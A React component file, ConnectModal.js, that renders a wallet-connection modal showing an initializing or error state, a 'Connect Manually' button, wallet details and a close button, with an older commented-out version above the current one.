// // ConnectModal.js
// import React from "react";
// import { Link } from "react-router-dom";

// const ConnectModal = ({ connecting, dots, selectedWallet, closeModal }) => {
//   return (
//     <div className="fixed top-0 right-0 bottom-0 left-0 flex items-center justify-center text-xl bg-gray-50 ">
//       <div className="bg-white p-5 rounded-xl w-[700px]">
//         <span className="border border-red-600 inline-flex items-center gap-10 w-full p-5 rounded-xl">
//           {connecting ? (
//             <p className="text-center">Initializing{Array(dots).fill(".").join("")}</p>
//           ) : (
//             <span className="inline-flex items-center gap-10 w-full">
//               <p>Error connecting</p>
//               <Link to="/">
//                 <button className="bg-red-400 p-2">Connect Manually</button>
//               </Link>
//             </span>
//           )}
//         </span>

//         <div className="flex justify-between items-center border my-4 p-5 rounded-xl">
//           <span>
//             <h2 className="text-xl font-semibold mb-4">{selectedWallet.name}</h2>
//             <p>Easy-to-use browser extension</p>
//           </span>
//           <img src={selectedWallet.image} alt="" className="w-14 h-14" />
//         </div>

//         <button
//           className="mt-4 px-4 py-2 bg-gray-600 text-white rounded-md"
//           onClick={closeModal}
//         >
//           Close
//         </button>
//       </div>
//     </div>
//   );
// };

// export default ConnectModal;

// ConnectModal.js
import React from "react";
// import { Link } from "react-router-dom";

const ConnectModal = ({
  connecting,
  dots,
  selectedWallet,
  closeModal,
  showManualConnectModal,
}) => {
  return (
    <div className="fixed top-0 right-0 bottom-0 left-0 h-screen flex items-center justify-center bg-gray-800 bg-opacity-50 shadow-md p-5">
    <div className="bg-white  w-full md:max-w-[700px]  mb-10 rounded-xl overflow-hidden p-5">
        <span className="border border-red-600 inline-flex items-center md:gap-10 gap-3 w-full p-5 rounded-xl text-xl md:text-2xl">
          {connecting ? (
            <p className="text-center ">
              Initializing{Array(dots).fill(".").join("")}
            </p>
          ) : (
            <span className="inline-flex items-center gap-10 w-full ">
              <p>Error connecting</p>
              <button className="bg-blue-400 text-white p-2" onClick={showManualConnectModal}>Connect Manually</button>
            </span>
          )}
        </span>

        <div className="flex justify-between items-center border my-4 p-5 rounded-xl">
          <span>
            <h2 className="text-xl font-semibold mb-4">
              {selectedWallet.name}
            </h2>
            <p>Easy-to-use browser extension</p>
          </span>
          <img src={selectedWallet.image} alt="" className="w-10 h-10 md:w-14 md:h-14" />
        </div>

        <button
          className="mt-4 px-4 py-2 bg-gray-600 text-white rounded-md"
          onClick={closeModal}
        >
          Close
        </button>
      </div>
    </div>
  );
};

export default ConnectModal;
